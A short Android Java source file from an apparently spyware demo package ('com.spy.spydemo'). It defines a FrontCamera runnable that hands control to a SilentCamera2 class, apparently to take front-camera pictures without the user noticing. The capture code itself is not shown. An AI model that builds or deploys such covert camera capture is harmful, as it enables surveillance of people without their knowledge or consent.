package com.spy.spydemo;

import android.content.Context;

public class FrontCamera implements Runnable{
    private Context context;

    public FrontCamera(Context context) {
        this.context = context;
    }

    @Override
    public void run() {
        SilentCamera2 camera = new SilentCamera2(this.context);
        camera.run(true);
    }
}
